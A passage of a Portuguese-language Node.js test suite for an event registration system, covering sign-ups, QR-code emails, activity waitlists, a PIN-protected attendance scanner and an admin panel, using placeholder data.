const assert = require('assert');
const { makeEnv } = require('./mocks');
let passed = 0, failed = 0;
function test(nome, fn) {
  try { fn(); passed++; console.log('  ok  ' + nome); }
  catch (e) { failed++; console.log('FALHOU ' + nome + '\n      ' + (e.stack || e).split('\n').slice(0, 4).join('\n      ')); }
}
function novo(opts) {
  const env = makeEnv(opts);
  env.ctx.setup_();
  env.setCfg = (k, v) => { const rows = env.ctx.readAll_('Config'); const r = rows.find(x => x.chave === k); env.ctx.updateRow_('Config', r._row, { valor: v }); env.ctx.resetConfigCache_(); };
  env.setCfg('SITE_URL', 'https://exemplo.github.io/semana');
  env.abrir = () => env.setCfg('INSCRICOES', 'ABERTAS');
  env.reg = (n, extra) => env.ctx.register_(Object.assign({ nome: 'Pessoa Teste ' + n, curso: 'Engenharia de Produção', periodo: '5º', matricula: '2024' + String(n).padStart(4, '0'), email: 'p' + n + '@exemplo.com' }, extra));
  env.ativ = (id, campos) => { const a = env.ctx.getAtividade_(id); env.ctx.updateRow_('Atividades', a._row, campos); };
  env.tabela = n => env.ctx.readAll_(n);
  env.insc = n => env.tabela('Inscritos').find(x => x.matricula === '2024' + String(n).padStart(4, '0'));
  env.token = n => env.insc(n).token;
  env.enroll = (n, at) => env.ctx.enroll_({ token: env.token(n), atividadeId: at });
  env.status = (n, at) => { const i = env.insc(n); const r = env.tabela('Inscricoes_Atividades').find(x => x.inscrito_id === i.id && x.atividade_id === at && x.status !== 'CANCELADA'); return r ? r.status + (r.posicao ? ':' + r.posicao : '') : null; };
  env.emailsDe = n => env.sent.filter(m => m.to === 'p' + n + '@exemplo.com');
  return env;
}

console.log('Setup');
test('cria todas as abas, configuração e 20 atividades', () => {
  const e = novo();
  ['Config', 'Atividades', 'Inscritos', 'Inscricoes_Atividades', 'Fila_Email', 'Alertas', 'Log'].forEach(n => assert(e.sheets[n], n));
  assert.strictEqual(e.tabela('Atividades').length, 20);
  assert.strictEqual(e.tabela('Config').find(x => x.chave === 'INSCRICOES').valor, 'FECHADAS');
});

console.log('Inscrição no evento');
test('inscrições fechadas são recusadas com texto formal', () => {
  const e = novo(); const r = e.reg(1);
  assert.strictEqual(r.ok, false); assert.strictEqual(r.code, 'FECHADAS'); assert(/CAEPRO/.test(r.mensagem));
  assert.strictEqual(e.tabela('Inscritos').length, 0);
});
test('validação de dados', () => {
  const e = novo(); e.abrir();
  const r = e.reg(1, { nome: 'Fulano', email: 'ruim', matricula: '1' });
  assert.strictEqual(r.code, 'INVALIDO'); assert(r.erros.nome && r.erros.email && r.erros.matricula);
});
test('inscrição válida cria registro, envia e-mail com QR inline e mede o tempo', () => {
  const e = novo(); e.abrir(); const r = e.reg(1);
  assert.strictEqual(r.ok, true); assert.strictEqual(r.status, 'CRIADA'); assert(/^[a-f0-9]{32}$/.test(r.token));
  const i = e.insc(1); assert.strictEqual(i.status, 'ATIVA'); assert.strictEqual(i.status_email, 'ENVIADO');
  assert.strictEqual(e.sent.length, 1);
  const m = e.sent[0];
  assert.strictEqual(m.subject, 'Semana de Engenharia de Produção — Sua inscrição está confirmada');
  assert(m.htmlBody.includes('cid:qr') && m.inlineImages.qr.bytes.length > 100);
  assert(m.attachments && m.attachments.length === 1 && /^QRCode-.*\.gif$/.test(m.attachments[0].name) && m.attachments[0].bytes.length > 100, 'QR também em anexo');
  assert(m.htmlBody.includes('Semana de Engenharia de Produção') && m.htmlBody.includes('caeproufpi'));
  assert(!m.htmlBody.includes('atividades.html') && /Novidades em breve/.test(m.htmlBody) && m.htmlBody.includes('instagram.com/caeproufpi'), 'sem atividade aberta: sem botão de atividades, com aviso do Instagram');
  assert(m.htmlBody.includes('qr.html?t=' + r.token) && /Novidades em breve/.test(m.body));
  assert(e.tabela('Log').some(l => l.evento === 'email_enviado'));
  assert(r.mensagem.includes('pode demorar'));
});
test('duplicidade por matrícula: não revela token, reenvia ao e-mail cadastrado e alerta o organizador', () => {
  const e = novo(); e.abrir(); e.reg(1);
  const r = e.reg(1, { email: 'outro@exemplo.com' });
  assert.strictEqual(r.status, 'JA_INSCRITO'); assert.strictEqual(r.token, undefined);
  assert(r.mensagem.includes('p***@exemplo.com'));
  assert.strictEqual(e.tabela('Inscritos').length, 1);
  assert.strictEqual(e.emailsDe(1).length, 2); assert.strictEqual(e.sent.filter(m => m.to === 'outro@exemplo.com').length, 0);
  assert(e.tabela('Alertas').some(a => a.tipo === 'DUPLICIDADE'));
});
test('sem cota: inscrição fica PENDENTE só para o organizador; reenvio automático depois', () => {
  const e = novo({ quota: 0 }); e.abrir(); const r = e.reg(1);
  assert.strictEqual(r.ok, true); assert(!/pendente/i.test(r.mensagem));
  assert.strictEqual(e.insc(1).status_email, 'PENDENTE');
  assert(e.tabela('Alertas').some(a => a.tipo === 'COTA_EMAIL'));
  e.state.quota = 100; e.ctx.tick();
  assert.strictEqual(e.insc(1).status_email, 'ENVIADO');
  assert(e.sent.some(m => m.to === 'organizador@exemplo.com' && /alerta/.test(m.subject)), 'resumo ao organizador');
});
test('falha repetida vira ERRO e alerta o organizador', () => {
  const e = novo(); e.abrir(); e.state.failSend = true; e.reg(1);
  for (let i = 0; i < 6; i++) e.ctx.processOutbox_(10);
  assert.strictEqual(e.insc(1).status_email, 'ERRO');
  assert(e.tabela('Alertas').some(a => a.tipo === 'FALHA_EMAIL'));
});
test('resumo de alertas respeita intervalo de 30 min', () => {
  const e = novo(); e.abrir(); e.reg(1); e.reg(1);
  assert.strictEqual(e.ctx.sendAlertDigest_(), true);
  e.reg(1); assert.strictEqual(e.ctx.sendAlertDigest_(), false);
});

console.log('Atividades, vagas, conflito e fila');
function cenario() {
  const e = novo(); e.abrir(); for (let n = 1; n <= 5; n++) e.reg(n);
  e.ativ('A16', { vagas_max: 2, inscricoes_abertas: 'SIM' });
  e.ativ('A15', { vagas_max: 3, inscricoes_abertas: 'SIM' });
  return e;
}
test('atividade fechada e token inválido são recusados', () => {
  const e = novo(); e.abrir(); e.reg(1);
  assert.strictEqual(e.enroll(1, 'A16').code, 'FECHADA');
  assert.strictEqual(e.ctx.enroll_({ token: 'x', atividadeId: 'A16' }).code, 'TOKEN');
});
test('não permite duas atividades no mesmo dia e horário (minicurso × visita)', () => {
  const e = cenario();
  assert.strictEqual(e.enroll(1, 'A16').status, 'CONFIRMADA');
  const r = e.enroll(1, 'A15'); assert.strictEqual(r.code, 'CONFLITO'); assert(r.mensagem.includes('Visita técnica'));
});
test('conflito também vale para sobreposição parcial; horários que apenas se tocam não conflitam', () => {
  const e = cenario();
  e.ativ('A12', { inscricoes_abertas: 'SIM' }); e.ativ('A13', { inscricoes_abertas: 'SIM' }); // 15:00-16:30 e 16:30-17:30
  assert.strictEqual(e.enroll(1, 'A12').status, 'CONFIRMADA');
  assert.strictEqual(e.enroll(1, 'A13').status, 'CONFIRMADA');
  e.ativ('A13', { inicio: '16:00' }); e.ativ('A10', { inscricoes_abertas: 'SIM' });
  assert.strictEqual(e.enroll(2, 'A12').status, 'CONFIRMADA');
  assert.strictEqual(e.enroll(2, 'A13').code, 'CONFLITO');
});
test('vagas lotadas: fila com posição, e-mails de fila e alerta de vagas esgotadas', () => {
  const e = cenario();
  assert.strictEqual(e.enroll(1, 'A16').status, 'CONFIRMADA'); assert.strictEqual(e.enroll(2, 'A16').status, 'CONFIRMADA');
  const r3 = e.enroll(3, 'A16'), r4 = e.enroll(4, 'A16');
  assert.strictEqual(r3.status, 'FILA'); assert.strictEqual(r3.posicao, 1); assert.strictEqual(r4.posicao, 2);
  assert(e.tabela('Alertas').some(a => a.tipo === 'VAGAS_ESGOTADAS'));
  const m = e.emailsDe(4).pop(); assert(/fila de espera/.test(m.subject)); assert(m.htmlBody.includes('posição 2'));
  assert.strictEqual(e.enroll(3, 'A16').code, 'JA_INSCRITO');
});
test('cancelar vaga promove o primeiro da fila e avisa por e-mail', () => {
  const e = cenario();
  [1, 2, 3, 4].forEach(n => e.enroll(n, 'A16'));
  const ia = e.tabela('Inscricoes_Atividades').find(x => x.inscrito_id === e.insc(1).id && x.atividade_id === 'A16');
  const r = e.ctx.cancelarVaga_(ia.id); e.ctx.processOutbox_(20);
  assert.strictEqual(r.promovidos, 1);
  assert.strictEqual(e.status(3, 'A16'), 'CONFIRMADA'); assert.strictEqual(e.status(4, 'A16'), 'FILA:1'); assert.strictEqual(e.status(1, 'A16'), null);
  assert(/saiu da fila de espera e entrou/i.test(e.emailsDe(3).pop().subject));
});
test('cancelar inscrição no evento cancela atividades, libera vagas e promove a fila', () => {
  const e = cenario();
  [1, 2, 3].forEach(n => e.enroll(n, 'A16'));
  const r = e.ctx.cancelarInscrito_(e.insc(2).id);
  assert.strictEqual(e.insc(2).status, 'CANCELADA'); assert.strictEqual(r.promovidos, 1); assert.strictEqual(e.status(3, 'A16'), 'CONFIRMADA');
  assert.strictEqual(e.ctx.enroll_({ token: e.token(2), atividadeId: 'A15' }).code, 'TOKEN');
});
test('aumentar o máximo de vagas promove a fila no próximo ciclo', () => {
  const e = cenario();
  [1, 2, 3, 4].forEach(n => e.enroll(n, 'A16'));
  e.ativ('A16', { vagas_max: 3 }); e.ctx.tick();
  assert.strictEqual(e.status(3, 'A16'), 'CONFIRMADA'); assert.strictEqual(e.status(4, 'A16'), 'FILA:1');
});
test('sem limite de vagas (campo vazio) nunca gera fila', () => {
  const e = cenario(); e.ativ('A16', { vagas_max: '' });
  [1, 2, 3, 4, 5].forEach(n => assert.strictEqual(e.enroll(n, 'A16').status, 'CONFIRMADA'));
});
test('promoção pula quem passou a ter conflito (edição manual na planilha) e mantém na fila', () => {
  const e = cenario();
  [1, 2, 3, 4].forEach(n => e.enroll(n, 'A16'));          // 3 e 4 na fila
  e.ctx.appendObj_('Inscricoes_Atividades', { id: 'X9999', inscrito_id: e.insc(3).id, atividade_id: 'A15', data_hora: 'x', status: 'CONFIRMADA' });
  const ia = e.tabela('Inscricoes_Atividades').find(x => x.inscrito_id === e.insc(1).id && x.atividade_id === 'A16');
  e.ctx.cancelarVaga_(ia.id);
  assert.strictEqual(e.status(3, 'A16'), 'FILA:1'); assert.strictEqual(e.status(4, 'A16'), 'CONFIRMADA');
});
test('inscrição manual pelo organizador funciona com atividade fechada', () => {
  const e = cenario(); e.ativ('A15', { inscricoes_abertas: 'NAO' });
  const r = e.ctx.inscreverManual_(e.insc(1).id, 'A15'); assert.strictEqual(r.status, 'CONFIRMADA');
});
test('abaixo do mínimo gera alerta ao fechar a atividade', () => {
  const e = cenario(); e.ativ('A15', { vagas_min: 5 }); e.enroll(1, 'A15'); e.ativ('A15', { inscricoes_abertas: 'NAO' });
  e.ctx.checkMinimos_(); assert(e.tabela('Alertas').some(a => a.tipo === 'ABAIXO_DO_MINIMO'));
});
test('me: lista atividades abertas, minha situação e posição na fila', () => {
  const e = cenario(); [1, 2, 3].forEach(n => e.enroll(n, 'A16'));
  const r = e.ctx.getMe_({ token: e.token(3) });
  const a = r.atividades.find(x => x.id === 'A16');
  assert.strictEqual(a.minha.status, 'FILA'); assert.strictEqual(a.minha.posicao, 1); assert.strictEqual(a.lotada, true); assert.strictEqual(a.restantes, 0);
  assert.strictEqual(r.atividades.find(x => x.id === 'A15').restantes, 3);
  assert(!r.atividades.some(x => x.id === 'A10'), 'fechadas não aparecem');
});
test('aba Atividades mostra ocupadas, restantes e fila como valores (sem fórmulas)', () => {
  const e = cenario(); [1, 2, 3].forEach(n => e.enroll(n, 'A16'));
  let a = e.tabela('Atividades').find(x => x.id === 'A16');
  assert.deepStrictEqual([a.ocupadas, a.restantes, a.na_fila], [2, 0, 1]);
  assert.strictEqual(e.tabela('Atividades').find(x => x.id === 'A03').restantes, 'sem limite');
  e.ctx.cancelarInscrito_(e.insc(1).id); a = e.tabela('Atividades').find(x => x.id === 'A16');
  assert.deepStrictEqual([a.ocupadas, a.restantes, a.na_fila], [2, 0, 0]);
  assert(!String(a.ocupadas).startsWith('='));
});
test('editar vagas na planilha (onEdit) promove a fila e atualiza as contagens', () => {
  const e = cenario(); [1, 2, 3].forEach(n => e.enroll(n, 'A16'));
  e.ativ('A16', { vagas_max: 3 });
  e.ctx.onEdit({ range: { getSheet: () => ({ getName: () => 'Atividades' }), getColumn: () => 7 } });
  assert.strictEqual(e.status(3, 'A16'), 'CONFIRMADA');
  assert.strictEqual(e.tabela('Atividades').find(x => x.id === 'A16').restantes, 0);
});
test('API: ação desconhecida e JSON inválido não quebram', () => {
  const e = novo(); assert.strictEqual(e.ctx.handle_({ action: 'x' }).ok, false);
  const out = e.ctx.doPost({ postData: { contents: '{ruim' } }); assert(/erro inesperado/.test(JSON.parse(out.s).mensagem));
});

console.log('Scanner');
function scan() {
  const e = novo(); e.abrir(); for (let n = 1; n <= 3; n++) e.reg(n);
  e.setCfg('PIN', '4321');
  e.lote = (itens, pin) => e.ctx.scanLote_({ pin: pin === undefined ? '4321' : pin, itens });
  let c = 0; e.por = (n, extra) => Object.assign({ kind: 'scan', modo: 'PORTARIA', dia: '2026-11-11', token: e.token(n), operador: 'Ana', clientId: 'c' + (++c), ts: Date.now(), localMs: 12 }, extra);
  return e;
}
test('PIN: incorreto, ausente e bloqueio após 8 erros (validado no servidor)', () => {
  const e = scan();
  assert.strictEqual(e.ctx.scanLista_({ pin: '0000' }).code, 'INVALIDO');
  assert.strictEqual(e.lote([e.por(1)], 'x').ok, false);
  for (let i = 0; i < 7; i++) e.ctx.scanLista_({ pin: 'x' });
  assert.strictEqual(e.ctx.scanLista_({ pin: '4321' }).code, 'BLOQUEADO');
  assert(e.tabela('Alertas').some(a => a.tipo === 'PIN_TENTATIVAS'));
  const e2 = novo(); assert.strictEqual(e2.ctx.scanLista_({ pin: '' }).code, 'SEM_PIN');
});
test('PIN: erros antigos (mais de 10 min) não somam; erros seguidos continuam bloqueando', () => {
  const e = scan();
  for (let i = 0; i < 7; i++) e.ctx.scanLista_({ pin: 'x' });
  e.props.PIN_FALHAS_DESDE = String(Date.now() - 11 * 60000);            // as 7 tentativas ficaram para trás
  assert.strictEqual(e.ctx.scanLista_({ pin: 'x' }).code, 'INVALIDO');   // conta como a 1ª, não bloqueia
  assert.strictEqual(e.ctx.scanLista_({ pin: '4321' }).ok, true);         // PIN certo funciona e zera
  for (let i = 0; i < 8; i++) e.ctx.scanLista_({ pin: 'x' });
  assert.strictEqual(e.ctx.scanLista_({ pin: '4321' }).code, 'BLOQUEADO');
});
test('lista: traz inscritos, atividades e estado atual', () => {
  const e = scan(); e.lote([e.por(1)]);
  const l = e.ctx.scanLista_({ pin: '4321' });
  assert.strictEqual(l.i.length, 3); assert.strictEqual(l.a.length, 20); assert.strictEqual(l.p[e.insc(1).id + '|2026-11-11'], 'ENTRADA');
});
test('portaria alterna ENTRADA/SAÍDA por dia e grava segundos, operador e tempo', () => {
  const e = scan();
  const r = e.lote([e.por(1), e.por(1), e.por(1), e.por(1, { dia: '2026-11-12' })]).resultados;
  assert.deepStrictEqual(r.map(x => x.tipo), ['ENTRADA', 'SAIDA', 'ENTRADA', 'ENTRADA']);
  const linha = e.tabela('Portaria')[0];
  assert(/^\d{4}-\d\d-\d\d \d\d:\d\d:\d\d$/.test(linha.data_hora)); assert.strictEqual(linha.operador, 'Ana'); assert.strictEqual(linha.local_ms, 12);
});
test('leitura repetida (mesmo clientId, reenvio da fila) não duplica', () => {
  const e = scan(); const it = e.por(1);
  e.lote([it]); const r = e.lote([it]).resultados[0];
  assert.strictEqual(r.repetido, true); assert.strictEqual(e.tabela('Portaria').length, 1);
});
test('QR inválido e inscrição cancelada são recusados', () => {
  const e = scan(); e.ctx.cancelarInscrito_(e.insc(2).id);
  const r = e.lote([e.por(1, { token: 'zzz' }), e.por(2)]).resultados;
  assert.strictEqual(r[0].resultado, 'TOKEN_INVALIDO'); assert.strictEqual(r[1].resultado, 'CANCELADA'); assert.strictEqual(e.tabela('Portaria').length, 0);
});
test('desfazer anula a leitura (sem apagar) e restaura a alternância', () => {
  const e = scan(); const a = e.por(1), b = e.por(1);
  e.lote([a, b]); e.lote([{ kind: 'undo', clientId: b.clientId }]);
  assert.strictEqual(e.tabela('Portaria')[1].status, 'ANULADO');
  assert.strictEqual(e.lote([e.por(1)]).resultados[0].tipo, 'SAIDA');
});
test('atividade: só ENTRADA, repetida = já registrado, sem inscrição = aviso, forçar registra', () => {
  const e = scan(); e.ativ('A16', { inscricoes_abertas: 'SIM' }); e.enroll(1, 'A16');
  const at = (n, extra) => e.por(n, Object.assign({ modo: 'ATIVIDADE', atividadeId: 'A16', dia: undefined }, extra));
  assert.strictEqual(e.lote([at(1)]).resultados[0].resultado, 'REGISTRADO');
  const rep = e.lote([at(1)]).resultados[0]; assert.strictEqual(rep.resultado, 'JA_REGISTRADO'); assert(/^\d\d:\d\d:\d\d$/.test(rep.horario));
  const ni = e.lote([at(2)]).resultados[0]; assert.strictEqual(ni.resultado, 'NAO_INSCRITO');
  assert.strictEqual(e.lote([at(2, { forcar: true })]).resultados[0].forcado, true);
  const pal = e.lote([e.por(3, { modo: 'ATIVIDADE', atividadeId: 'A03' })]).resultados[0]; // palestra livre
  assert.strictEqual(pal.resultado, 'REGISTRADO'); assert.strictEqual(e.tabela('Presenca_Atividades').length, 3);
});
test('atividade: quem está na fila é sinalizado como NAO_INSCRITO com a situação', () => {
  const e = scan(); e.ativ('A16', { inscricoes_abertas: 'SIM', vagas_max: 1 }); e.enroll(1, 'A16'); e.enroll(2, 'A16');
  const r = e.lote([e.por(2, { modo: 'ATIVIDADE', atividadeId: 'A16' })]).resultados[0];
  assert.strictEqual(r.resultado, 'NAO_INSCRITO'); assert.strictEqual(r.situacao, 'FILA');
});
test('horário da leitura vem do aparelho (fila offline), limitado a ±36 h', () => {
  const e = scan(); const ts = Date.now() - 3600 * 1000;
  e.lote([e.por(1, { ts }), e.por(2, { ts: 5 })]);
  const t = e.tabela('Portaria'); assert.strictEqual(t[0].ts, ts); assert(Math.abs(t[1].ts - Date.now()) < 60000);
});
test('permanência soma pares entrada→saída, sinaliza saída pendente e gera certificados', () => {
  const e = scan(); const h = 3600 * 1000, base = Date.now() - 10 * h;
  e.lote([e.por(1, { ts: base }), e.por(1, { ts: base + 2 * h }), e.por(1, { ts: base + 3 * h }), e.por(1, { ts: base + 4 * h + 30 * 60000 }),
          e.por(2, { ts: base }), e.por(2, { ts: base + 1 * h }), e.por(2, { ts: base + 2 * h })]);
  const r = e.ctx.recalcularPermanencia_();
  const perm = e.tabela('Permanencia'); const cert = e.tabela('Certificados');
  assert.strictEqual(perm.find(x => x.inscrito_id === e.insc(1).id).minutos, 210);
  assert.strictEqual(perm.find(x => x.inscrito_id === e.insc(2).id).saida_pendente, 'SIM');
  assert.strictEqual(cert.find(x => x.inscrito_id === e.insc(1).id).horas, 3.5); assert.strictEqual(r.pendentes, 1);
});

console.log('Blindagem');
test('formulário: campo-isca preenchido e envio rápido demais são barrados', () => {
  const e = novo(); e.abrir();
  assert.strictEqual(e.reg(1, { campo_extra: 'http://spam' }).code, 'RAPIDO');
  assert.strictEqual(e.reg(1, { tempoMs: 300 }).code, 'RAPIDO');
  assert.strictEqual(e.tabela('Inscritos').length, 0);
  assert.strictEqual(e.reg(1, { tempoMs: 9000, campo_extra: '' }).ok, true);
});
test('sistema ocupado (lock) responde com mensagem clara, sem erro técnico', () => {
  const e = novo(); e.abrir(); e.state.lockBusy = true;
  const r = e.ctx.handleSeguro_({ action: 'register', nome: 'Pessoa Teste', curso: 'x', periodo: '1º', matricula: '20240001', email: 'a@b.com' });
  assert.strictEqual(r.code, 'OCUPADO'); assert(/muitas solicitações/.test(r.mensagem)); assert.strictEqual(e.tabela('Inscritos').length, 0);
});
test('cada aba é lida uma vez por execução e o cache respeita as gravações', () => {
  const e = novo(); e.abrir(); e.reg(1);
  let leituras = 0; const orig = e.ctx.lerAba_; e.ctx.lerAba_ = n => { leituras++; return orig(n); };
  e.ctx.limparCache_(); e.ctx.readAll_('Inscritos'); e.ctx.readAll_('Inscritos'); e.ctx.readAll_('Inscritos');
  assert.strictEqual(leituras, 1);
  const a = e.ctx.readAll_('Inscritos'); a[0].nome = 'ALTERADO'; assert.notStrictEqual(e.ctx.readAll_('Inscritos')[0].nome, 'ALTERADO', 'cópias isoladas');
  e.ctx.updateRow_('Inscritos', 2, { nome: 'Novo Nome' }); assert.strictEqual(e.ctx.readAll_('Inscritos')[0].nome, 'Novo Nome');
});
function editar(e, aba, linha, col, valor, antigo) {
  const rng = e.sheets[aba].getRange(linha, col); rng.setValue(valor);
  e.ctx.onEdit({ range: rng, value: valor, oldValue: antigo });
  return rng.getValue();
}
test('editar e-mail na planilha: valida, normaliza e reenvia o QR; inválido é revertido', () => {
  const e = novo(); e.abrir(); e.reg(1); e.sent.length = 0;
  assert.strictEqual(editar(e, 'Inscritos', 2, 7, 'ruim', 'p1@exemplo.com'), 'p1@exemplo.com');
  assert.strictEqual(editar(e, 'Inscritos', 2, 7, '  Novo@Exemplo.COM ', 'p1@exemplo.com'), 'novo@exemplo.com');
  assert.strictEqual(e.insc(1).status_email, 'PENDENTE');
  e.state.quota = 100; e.ctx.tick();
  assert.strictEqual(e.emailsDe(1).length, 0); assert(e.sent.some(m => m.to === 'novo@exemplo.com'));
});
test('editar matrícula na planilha: não permite duplicar nem formato inválido', () => {
  const e = novo(); e.abrir(); e.reg(1); e.reg(2);
  assert.strictEqual(editar(e, 'Inscritos', 3, 6, '20240001', '20240002'), '20240002');
  assert.strictEqual(editar(e, 'Inscritos', 3, 6, '!', '20240002'), '20240002');
  assert.strictEqual(editar(e, 'Inscritos', 3, 6, ' 2024 0099 ', '20240002'), '20240099');
});
test('mudar status para CANCELADA na planilha libera vagas e promove a fila; id e token são protegidos', () => {
  const e = cenario(); [1, 2, 3].forEach(n => e.enroll(n, 'A16'));
  editar(e, 'Inscritos', 2, 9, 'cancelada', 'ATIVA');
  assert.strictEqual(e.insc(1).status, 'CANCELADA'); assert.strictEqual(e.status(3, 'A16'), 'CONFIRMADA');
  assert.strictEqual(editar(e, 'Inscritos', 3, 2, 'x', e.insc(2).token), e.insc(2).token);
  assert.strictEqual(editar(e, 'Inscritos', 3, 9, 'QUALQUER', 'ATIVA'), 'ATIVA');
});
test('painel e base de análise: totais por curso, atividades, permanência e tempos', () => {
  const e = scan(); e.ativ('A16', { inscricoes_abertas: 'SIM', vagas_max: 1 }); e.enroll(1, 'A16'); e.enroll(2, 'A16');
  const h = 3600 * 1000, base = Date.now() - 5 * h;
  e.lote([e.por(1, { ts: base }), e.por(1, { ts: base + 2 * h })]);
  e.lote([e.por(1, { modo: 'ATIVIDADE', atividadeId: 'A16' })]);
  e.ctx.atualizarPainel_();
  const b = e.tabela('Base_Analise');
  assert.strictEqual(b.length, 3);
  const p1 = b.find(x => x.matricula === '20240001');
  assert.deepStrictEqual([p1.atividades_confirmadas, p1.presencas_em_atividades, p1.dias_presentes, p1.minutos_permanencia, p1.horas], [1, 1, 1, 120, 2]);
  assert.strictEqual(b.find(x => x.matricula === '20240002').atividades_em_fila, 1);
  const painel = e.sheets['Painel'].data.map(r => r.join('|')).join('\n');
  assert(/Inscritos ativos\|3/.test(painel)); assert(/Engenharia de Produção\|3/.test(painel)); assert(/A16 — Visita técnica/.test(painel));
});
test('cópia de segurança devolve o endereço da cópia', () => {
  const e = novo(); assert(/^https:\/\/exemplo\/Backup/.test(e.ctx.criarBackup_()));
});

console.log('Publicação automática');
test('migração por versão: roda uma vez, instala gatilhos e a ação "versao" informa o código em execução', () => {
  const e = makeEnv(); e.ctx.setup_();
  const r1 = e.ctx.handleSeguro_({ action: 'versao' });
  assert.strictEqual(r1.ok, true); assert.strictEqual(r1.migrou, true); assert.strictEqual(r1.versao, 'dev');
  assert.deepStrictEqual(e.state.triggers.sort(), ['backupDiario', 'tick']);
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'versao' }).migrou, false);
  e.run("CODIGO_VERSAO = 'abc1234'");                       // simula nova publicação
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'versao' }).migrou, true);
  assert.strictEqual(e.state.triggers.length, 2, 'gatilhos não duplicam');
});
test('gatilho apagado por engano é recriado no próximo ciclo', () => {
  const e = makeEnv(); e.ctx.setup_(); e.ctx.garantirMigracao_();
  e.state.triggers = ['tick'];
  e.ctx.tick(); assert.deepStrictEqual(e.state.triggers.sort(), ['backupDiario', 'tick']);
});
test('migração preserva dados existentes (não apaga inscritos nem atividades editadas)', () => {
  const e = novo(); e.abrir(); e.reg(1); e.ativ('A16', { vagas_max: 7 });
  e.ctx.garantirMigracao_();
  assert.strictEqual(e.tabela('Inscritos').length, 1); assert.strictEqual(e.ctx.getAtividade_('A16').vagas_max, 7);
});
test('prepare-gas: envia só os .gs separados, sem dist/, e grava a versão do commit', () => {
  const { execFileSync } = require('child_process'), fs = require('fs'), path = require('path');
  execFileSync('node', [path.join(__dirname, '..', 'scripts', 'prepare-gas.js')], { env: Object.assign({}, process.env, { GITHUB_SHA: 'deadbeefcafe' }), stdio: 'pipe' });
  const dir = path.join(__dirname, '..', 'build', 'gas'), arqs = fs.readdirSync(dir);
  assert(arqs.includes('appsscript.json') && arqs.includes('Api.gs') && !arqs.includes('Codigo.gs'));
  assert(/CODIGO_VERSAO = 'deadbee'/.test(fs.readFileSync(path.join(dir, 'Versao.gs'), 'utf8')));
});

console.log('Painel de administração');
function admin(extra) {
  const e = cenario(); e.setCfg('PIN_ADMIN', 'senhaForte123');
  e.adm = (acao, campos) => e.ctx.handleSeguro_(Object.assign({ action: acao, pin: 'senhaForte123', operador: 'Admin Teste' }, campos));
  return e;
}
test('senha do admin: ausente, fraca/igual ao PIN do scanner, errada e bloqueio por tentativas', () => {
  const e = cenario();
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'x' }).code, 'SEM_PIN');
  e.setCfg('PIN_ADMIN', '1234567'); assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: '1234567' }).code, 'FRACO');
  e.setCfg('PIN', 'senhaForte123'); e.setCfg('PIN_ADMIN', 'senhaForte123'); assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'senhaForte123' }).code, 'FRACO');
  e.setCfg('PIN', '4321');
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'errada' }).code, 'INVALIDO');
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'senhaForte123' }).ok, true);
  for (let n = 0; n < 8; n++) e.ctx.handleSeguro_({ action: 'admin_login', pin: 'errada' });
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'senhaForte123' }).code, 'BLOQUEADO');
});
test('falha de autenticação é marcada (auth) e erro de validação não', () => {
  const e = admin();
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_resumo', pin: 'x' }).auth, true);
  const v = e.adm('admin_editar', { id: e.insc(1).id, campos: { email: 'ruim' } }); assert.strictEqual(v.ok, false); assert.strictEqual(v.auth, undefined);
});
test('o PIN do scanner NÃO abre o painel e a senha do admin NÃO abre o scanner', () => {
  const e = admin(); e.setCfg('PIN', '4321');
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_resumo', pin: '4321' }).ok, false);
  assert.strictEqual(e.ctx.scanLista_({ pin: 'senhaForte123' }).ok, false);
});
test('ações de escrita exigem o nome do operador', () => {
  const e = admin();
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_set_inscricoes', pin: 'senhaForte123', valor: 'FECHADAS' }).code, 'OPERADOR');
  assert.strictEqual(e.adm('admin_resumo').ok, true);
});
test('resumo e busca (nome sem acento, matrícula, e-mail); token nunca é devolvido', () => {
  const e = admin(); const r = e.adm('admin_resumo');
  assert.strictEqual(r.inscritosAtivos, 5); assert.strictEqual(r.inscricoesAbertas, true); assert.strictEqual(r.porCurso[0][1], 5);
  e.ctx.updateRow_('Inscritos', 2, { nome: 'José da Conceição' });
  assert.strictEqual(e.adm('admin_buscar', { q: 'jose conceicao'.split(' ')[0] }).resultados.length >= 1, true);
  assert.strictEqual(e.adm('admin_buscar', { q: 'conceicao' }).resultados[0].nome, 'José da Conceição');
  assert.strictEqual(e.adm('admin_buscar', { q: '20240003' }).resultados.length, 1);
  assert.strictEqual(e.adm('admin_buscar', { q: 'p4@exemplo' }).resultados.length, 1);
  assert.strictEqual(e.adm('admin_buscar', { q: 'a' }).resultados.length, 0);
  assert(!JSON.stringify(e.adm('admin_buscar', { q: 'pessoa' })).includes(e.token(1)), 'token vazou na busca');
  assert(!JSON.stringify(e.adm('admin_ficha', { id: e.insc(1).id })).includes(e.token(1)), 'token vazou na ficha');
});
test('ficha traz atividades, fila, presenças, portaria e e-mails', () => {
  const e = admin(); [1, 2, 3].forEach(n => e.enroll(n, 'A16'));
  e.ctx.scanLote_({ pin: (e.setCfg('PIN', '4321'), '4321'), itens: [{ kind: 'scan', modo: 'PORTARIA', dia: '2026-11-11', token: e.token(3), clientId: 'c1', operador: 'Ana' }] });
  const f = e.adm('admin_ficha', { id: e.insc(3).id });
  assert.strictEqual(f.atividades[0].status, 'FILA'); assert.strictEqual(f.atividades[0].posicao, 1);
  assert.strictEqual(f.portaria.length, 1); assert(f.emails.length >= 1);
});
test('editar: valida, protege matrícula única e reenvia o QR quando o e-mail muda; registra no Log', () => {
  const e = admin(); const id = e.insc(1).id; e.sent.length = 0;
  assert.strictEqual(e.adm('admin_editar', { id, campos: { email: 'ruim' } }).erros.email !== undefined, true);
  assert.strictEqual(e.adm('admin_editar', { id, campos: { matricula: '20240002' } }).erros.matricula !== undefined, true);
  const r = e.adm('admin_editar', { id, campos: { nome: '  Maria   Souza Lima ', email: 'Novo@Exemplo.com' } });
  assert.strictEqual(r.ok, true); assert.strictEqual(r.emailReenviado, true);
